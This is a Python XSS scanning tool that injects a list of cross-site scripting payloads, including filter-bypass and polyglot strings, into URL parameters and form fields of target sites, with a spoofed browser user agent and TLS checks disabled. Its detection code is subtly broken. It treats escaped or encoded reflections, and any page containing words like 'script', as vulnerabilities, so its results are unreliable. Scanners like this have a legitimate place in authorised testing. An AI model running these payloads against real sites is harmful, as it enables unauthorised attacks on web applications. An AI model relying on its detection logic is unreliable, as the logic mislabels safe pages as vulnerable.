import requests
import urllib.parse
import re
import time
from typing import List, Dict, Any
import html

class XSSScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # Enhanced XSS payloads for different contexts
        self.payloads = [
            # Basic script tags
            '<script>alert("XSS")</script>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            
            # Event handlers
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<body onload=alert("XSS")>',
            '<iframe onload=alert("XSS")>',
            
            # JavaScript URLs
            'javascript:alert("XSS")',
            'JaVaScRiPt:alert("XSS")',
            
            # HTML entity encoding bypass
            '&lt;script&gt;alert("XSS")&lt;/script&gt;',
            '&#60;script&#62;alert("XSS")&#60;/script&#62;',
            
            # Attribute context
            '" onmouseover="alert(\'XSS\')"',
            '\' onmouseover=\'alert("XSS")\' ',
            
            # CSS context
            '</style><script>alert("XSS")</script>',
            'expression(alert("XSS"))',
            
            # Advanced payloads
            '<svg><animatetransform onbegin=alert("XSS")>',
            '<select onfocus=alert("XSS") autofocus>',
            '<textarea onfocus=alert("XSS") autofocus>',
            '<keygen onfocus=alert("XSS") autofocus>',
            
            # Filter bypass techniques
            '<ScRiPt>alert("XSS")</ScRiPt>',
            '<script>alert(/XSS/)</script>',
            '<script>alert`XSS`</script>',
            
            # DOM-based payloads
            '#<script>alert("XSS")</script>',
            'javascript:void(alert("XSS"))',
            
            # Polyglot payloads
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
        ]
        
        # Unique markers for detection
        self.unique_marker = "XSS_TEST_MARKER_" + str(int(time.time()))

    def scan_url(self, url: str, params: Dict[str, str] = None) -> Dict[str, Any]:
        """Scan a single URL for XSS vulnerabilities"""
        print(f"[+] Scanning XSS: {url}")
        
        vulnerabilities = []
        
        try:
            # Parse URL and extract parameters
            parsed_url = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            
            # Convert multi-value params to single values
            for key in query_params:
                if isinstance(query_params[key], list):
                    query_params[key] = query_params[key][0]
            
            # If additional params provided, merge them
            if params:
                query_params.update(params)
            
            # Test each parameter with each payload
            for param_name in query_params.keys():
                for payload in self.payloads:
                    vuln = self._test_parameter(url, param_name, payload, query_params)
                    if vuln:
                        vulnerabilities.append(vuln)
                        break  # Found vulnerability, move to next parameter
            
            # Also test POST parameters if it's a form
            post_vulns = self._test_post_parameters(url)
            vulnerabilities.extend(post_vulns)
            
        except Exception as e:
            print(f"[!] Error scanning {url}: {str(e)}")
            
        return {
            'url': url,
            'vulnerable': len(vulnerabilities) > 0,
            'vulnerabilities': vulnerabilities,
            'total_vulnerabilities': len(vulnerabilities)
        }
    
    def _test_parameter(self, url: str, param_name: str, payload: str, original_params: Dict) -> Dict[str, Any]:
        """Test a specific parameter with a payload"""
        try:
            # Create test parameters
            test_params = original_params.copy()
            test_params[param_name] = payload
            
            # Make request
            response = self.session.get(url, params=test_params, timeout=10, verify=False)
            
            # Check for reflected payload in response
            if self._detect_xss_in_response(response.text, payload):
                return {
                    'type': 'Reflected XSS',
                    'parameter': param_name,
                    'payload': payload,
                    'method': 'GET',
                    'evidence': self._extract_evidence(response.text, payload),
                    'severity': self._calculate_severity(payload),
                    'context': self._detect_context(response.text, payload)
                }
        except Exception as e:
            print(f"[!] Error testing parameter {param_name}: {str(e)}")
        
        return None
    
    def _test_post_parameters(self, url: str) -> List[Dict[str, Any]]:
        """Test POST parameters for XSS"""
        vulnerabilities = []
        
        try:
            # Get the page to find forms
            response = self.session.get(url, timeout=10, verify=False)
            
            # Find forms in the page
            forms = self._extract_forms(response.text)
            
            for form in forms:
                for field_name in form.get('fields', []):
                    for payload in self.payloads[:5]:  # Test fewer payloads for POST
                        vuln = self._test_post_field(form['action'], field_name, payload, form['fields'])
                        if vuln:
                            vulnerabilities.append(vuln)
                            break
        except Exception as e:
            print(f"[!] Error testing POST parameters: {str(e)}")
        
        return vulnerabilities
    
    def _test_post_field(self, action_url: str, field_name: str, payload: str, all_fields: Dict) -> Dict[str, Any]:
        """Test a specific POST field"""
        try:
            # Prepare POST data
            post_data = all_fields.copy()
            post_data[field_name] = payload
            
            # Make POST request
            response = self.session.post(action_url, data=post_data, timeout=10, verify=False)
            
            # Check for reflected payload
            if self._detect_xss_in_response(response.text, payload):
                return {
                    'type': 'Reflected XSS (POST)',
                    'parameter': field_name,
                    'payload': payload,
                    'method': 'POST',
                    'evidence': self._extract_evidence(response.text, payload),
                    'severity': self._calculate_severity(payload),
                    'context': self._detect_context(response.text, payload)
                }
        except Exception as e:
            print(f"[!] Error testing POST field {field_name}: {str(e)}")
        
        return None
    
    def _detect_xss_in_response(self, response_text: str, payload: str) -> bool:
        """Detect if XSS payload is reflected in response"""
        # Direct reflection check
        if payload in response_text:
            return True
        
        # HTML entity encoded check
        encoded_payload = html.escape(payload)
        if encoded_payload in response_text:
            return True
        
        # URL encoded check
        url_encoded = urllib.parse.quote(payload)
        if url_encoded in response_text:
            return True
        
        # Partial reflection check (for filtered payloads)
        key_parts = ['script', 'alert', 'onerror', 'onload', 'javascript']
        for part in key_parts:
            if part in payload.lower() and part in response_text.lower():
                return True
        
        return False
    
    def _extract_evidence(self, response_text: str, payload: str) -> str:
        """Extract evidence of XSS reflection"""
        # Find the context where payload appears
        payload_index = response_text.lower().find(payload.lower())
        if payload_index != -1:
            start = max(0, payload_index - 50)
            end = min(len(response_text), payload_index + len(payload) + 50)
            return response_text[start:end].strip()
        
        return "Payload reflected in response"
    
    def _detect_context(self, response_text: str, payload: str) -> str:
        """Detect the context where XSS payload is reflected"""
        payload_index = response_text.lower().find(payload.lower())
        if payload_index == -1:
            return "unknown"
        
        # Look around the payload for context
        start = max(0, payload_index - 100)
        end = min(len(response_text), payload_index + len(payload) + 100)
        context = response_text[start:end]
        
        if '<script' in context.lower():
            return "script"
        elif 'href=' in context.lower():
            return "attribute"
        elif '<style' in context.lower():
            return "style"
        elif '<!--' in context:
            return "comment"
        else:
            return "html"
    
    def _calculate_severity(self, payload: str) -> str:
        """Calculate severity based on payload type"""
        if 'script' in payload.lower():
            return "High"
        elif any(event in payload.lower() for event in ['onload', 'onerror', 'onclick']):
            return "High"
        elif 'javascript:' in payload.lower():
            return "Medium"
        else:
            return "Medium"
    
    def _extract_forms(self, html_content: str) -> List[Dict[str, Any]]:
        """Extract forms from HTML content"""
        forms = []
        
        # Simple regex to find forms (could be improved with proper HTML parsing)
        form_pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>'
        input_pattern = r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>'
        
        for form_match in re.finditer(form_pattern, html_content, re.IGNORECASE | re.DOTALL):
            action = form_match.group(1)
            form_content = form_match.group(2)
            
            # Find input fields
            fields = {}
            for input_match in re.finditer(input_pattern, form_content, re.IGNORECASE):
                field_name = input_match.group(1)
                fields[field_name] = "test_value"
            
            if fields:
                forms.append({
                    'action': action,
                    'fields': fields
                })
        
        return forms
    
    def scan_multiple_urls(self, urls: List[str]) -> List[Dict[str, Any]]:
        """Scan multiple URLs for XSS vulnerabilities"""
        results = []
        
        print(f"[*] Scanning {len(urls)} URLs for XSS...")
        
        for url in urls:
            result = self.scan_url(url)
            results.append(result)
            
            if result['vulnerable']:
                print(f"[!] XSS vulnerability found: {url}")
            
            # Small delay to avoid overwhelming the target
            time.sleep(0.5)
        
        return results
